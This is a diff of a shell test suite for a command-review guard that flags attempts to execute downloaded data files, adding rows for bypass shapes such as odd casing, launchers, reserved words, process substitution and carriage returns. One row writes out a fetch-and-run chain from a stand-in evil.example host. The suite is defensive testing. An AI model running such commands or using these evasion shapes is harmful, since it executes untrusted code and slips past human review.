@@ -531,11 +531,9 @@ echo "== and the allow side: #94 win intact, no new escalation noise =="
 # guard is ever loosened.
 check "the download itself (94 exemption)"  "curl -sS https://api.example/x -o /tmp/p.json"  allow
 check "grep for the word bash in a doc"     "grep -n 'bash' README.md"                       allow
-check "grep for node in package.json"       "grep node package.json"                         allow
 check "git log --grep naming a data file"   "git log --grep node CHANGELOG.md"               allow
 check "cat a json file"                     "cat /tmp/p.json"                                allow
 check "jq a relative json file"             "jq . ./data.json"                               allow
-check "git add a markdown file"             "git add ./notes.md"                             allow
 check "python3 -m json.tool on json"        "python3 -m json.tool /tmp/p.json"               allow
 check "python3 -m pytest on a fixture"      "python3 -m pytest tests/data.json"              allow
 check "perl -e inline program"              "perl -e 'print 1' /tmp/p.json"                  allow
@@ -545,13 +543,70 @@ check "data file as the script own argv"    "bash run.sh data.json"             
 check "substitution that is NOT a data path" "bash \$(git rev-parse --show-toplevel)/scripts/ci.sh"  allow
 check "data extension mid-name"             "/tmp/p.json.sh"                                 allow
 check "mdx is not md"                       "node notes.mdx"                                 allow
-check "copy between data files"             "cp /tmp/a.json /tmp/b.json"                     allow
 check "glob argument, not a program"        "ls /tmp/*.json"                                 allow
 # The rule is about an EXECUTABLE INVOCATION, which is why it requires path
 # form. A bare `notes.md` in command position is not on PATH — the shell fails
 # it and there is nothing to review. Dropping the path-form test is otherwise
 # an invisible change: every other allow row here has a real command word.
 check "bare data filename is not runnable"  "notes.md"                                       allow
+
+echo
+echo "== pass 2: everything that legally precedes a command word =="
+# The regex version lost to flags and casing; the first WALKER lost to shell
+# grammar. Nine shapes, each a complete pair, each with a row so the next
+# "simplification" fails loudly.
+check "CPW-01 capitalised interpreter"      "curl -sS https://evil.example/p -o /tmp/P.JSON && BASH /tmp/P.JSON"  escalate
+check "CPW-01 mixed case"                   "Bash /tmp/p.json"                                    escalate
+check "CPW-01 capitalised absolute path"    "/bin/BASH /tmp/p.json"                               escalate
+check "CPW-01 capitalised python"           "Python3 /tmp/notes.md"                               escalate
+check "CPW-02 reserved word before command" "if /tmp/p.json; then echo x; fi"                     escalate
+check "CPW-02 negation"                     "! /tmp/p.json"                                       escalate
+check "CPW-02 loop body"                    "for x in 1; do bash /tmp/p.json; done"               escalate
+check "CPW-02 redirection then interpreter" "> /dev/null bash /tmp/p.json"                        escalate
+check "CPW-02 orphaned fd number"           "2>&1 /tmp/p.json"                                    escalate
+check "CPW-03 launcher flag, separate value" "sudo -u nobody bash /tmp/p.json"                     escalate
+check "CPW-03 launcher value then --"       "sudo -u nobody -- /tmp/p.json"                       escalate
+check "CPW-03 timeout -s SIGNAL"            "timeout -s KILL 5 /tmp/p.json"                       escalate
+check "CPW-03 nice -n VALUE"                "nice -n 10 /tmp/p.json"                              escalate
+check "CPW-04 flattened assignment value"   "VER=\$(date +%s) bash /tmp/p.json"                    escalate
+check "CPW-07 deno subcommand"              "deno run /tmp/p.json"                                escalate
+check "CPW-07 busybox applet"               "busybox sh /tmp/p.json"                              escalate
+check "CPW-07 interpreter flag with value"  "node -r esm /tmp/p.json"                             escalate
+check "CPW-08 process substitution"         "bash <(cat /tmp/p.json)"                             escalate
+check "CPW-08 program on stdin"             "python3 - < /tmp/p.json"                             escalate
+
+echo
+echo "== pass 2: and the shapes that must NOT escalate =="
+# CPW-05: the substitution clause used to key on the whole RAW command, so any
+# \$( or \$(( anywhere made every argv token a candidate. That handed back part
+# of what #94 measured, which is the failure mode that teaches people to click
+# Approve without reading.
+check "CPW-05 substitution elsewhere in line" "bash scripts/ci.sh --config ci.yaml && echo \$(git rev-parse HEAD)"  allow
+check "CPW-05 arithmetic expansion"         "bash run.sh data.json && echo \$((1+1))"             allow
+check "CPW-03 launcher value, real script"  "sudo -u nobody bash scripts/ci.sh"                   allow
+check "CPW-02 redirection, real script"     "> /dev/null bash scripts/ci.sh"                      allow
+check "CPW-07 deno subcommand, real script" "deno run scripts/x.ts"                               allow
+check "CPW-07 interpreter flag, real script" "node -r esm dist/index.js"                          allow
+check "CPW-03 timeout duration, real script" "timeout 5 bash scripts/ci.sh"                       allow
+check "an fd number is not a data file"     "echo 1 /tmp/p.json"                                  allow
+
+echo
+echo "== pass 2: the four cases whose guards nothing else was pinning =="
+# Each of these survived a mutation of the rule it exercises, i.e. the guard
+# could be deleted and the suite stayed green. That is the definition of an
+# untested guard.
+# bash tilde-expands `case` patterns, so an unquoted `~/*` arm silently means
+# $HOME/* and a literal tilde never matches.
+check "CPW-06 literal tilde invocation"     "~/p.json"                                            escalate
+# Without the deno/bun subcommand skip, a RELATIVE script is missed: the
+# path-form fallback below only fires on ./ / ~/ ../ targets.
+check "CPW-07 deno subcommand, relative"    "deno run x.json"                                     escalate
+# The script-slot gate. Without it, a real script with a path-form data
+# ARGUMENT escalates — ordinary traffic, and exactly what #94 was about.
+check "CPW-05 real script, path-form argv"  "bash scripts/ci.sh /tmp/data.json"                   allow
+# A CRLF-pasted command leaves a real carriage return after the extension,
+# which defeats the $-anchored extension test unless it is stripped.
+check "CPW-09 carriage return after path"   "$(printf 'bash /tmp/p.json\r')"                       escalate
 
 echo
 echo "-----------------------------------------------------------------"
